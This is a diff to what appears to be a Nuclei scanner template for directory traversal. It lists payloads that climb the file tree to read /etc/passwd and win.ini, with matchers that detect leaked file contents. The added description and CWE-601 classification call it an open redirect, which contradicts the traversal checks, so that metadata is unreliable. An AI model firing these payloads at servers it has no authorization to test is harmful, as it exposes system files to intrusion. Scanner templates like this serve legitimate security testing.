@@ -1,10 +1,20 @@
-id: traversal-fuzzer
+id: traversal-erickfernandox
 
 info:
-  name: Directory Traversal
+  name: Traversal Fuzzer
   author: erickfernandox
   severity: high
-  tags: cve,traversal
+  description: |
+    An open redirect vulnerability was detected. An attacker can redirect a user
+    to a malicious site and possibly obtain sensitive information, modify data, 
+    and/or execute unauthorized operations.
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
+    cvss-score: 6.1
+    cwe-id: CWE-601
+  metadata:
+    max-request: 3
+  tags: traversal, generic
 
 http:
   - method: GET
@@ -27,17 +37,17 @@ http:
       - "{{BaseURL}}/../../../../../../../../../etc/passwd%00"
       - "{{BaseURL}}/..;/..;/..;/..;/..;/..;/..;/..;/..;/windows/win.ini"
       - "{{BaseURL}}/..;/..;/..;/..;/..;/..;/..;/..;/..;/etc/passwd"         
-
+      
+    stop-at-first-match: true
     matchers-condition: and
     matchers:
-      - type: status
-        status:
-          - 200
-
       - type: regex
         part: body
         regex:
           - "root:[x*]:0:0:"
-          - "\\[(font|extension|file)s\\]"
-
-        conditon: or
+          - "\\[(font|extension|file)s\\]"     
+      
+      - type: status
+        status:
+          - 200
+        condition: or
